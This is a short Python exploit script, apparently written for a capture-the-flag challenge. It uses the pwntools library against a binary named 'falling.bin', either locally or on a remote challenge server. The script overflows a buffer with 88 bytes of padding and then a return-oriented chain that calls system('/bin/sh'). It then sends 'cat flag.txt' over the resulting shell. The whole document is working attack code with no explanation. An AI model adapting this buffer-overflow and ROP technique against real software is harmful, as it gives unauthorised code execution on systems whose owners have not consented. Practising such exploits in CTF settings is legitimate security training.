#!/usr/bin/env python3

from pwn import *

EXE = ELF("./falling.bin")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote(
        "spaceheroes-falling-in-rop.chals.io",
        443,
        ssl=True,
        sni="spaceheroes-falling-in-rop.chals.io",
    )
elif args.GDB:
    r = gdb.debug(EXE.path, "b vuln")
else:
    r = process(EXE.path)

system_addr = EXE.symbols["system"]
bin_sh_addr = EXE.search(b"/bin/sh").__next__()
print(f"system_addr: {hex(system_addr)}")
print(f"bin_sh_addr: {hex(bin_sh_addr)}")
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 88 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)

r.recvuntil(b"Tell me who you are: ")
r.sendline(payload)

r.sendline(b"cat flag.txt")
flag = r.recvline()
r.close()

print(flag.decode())
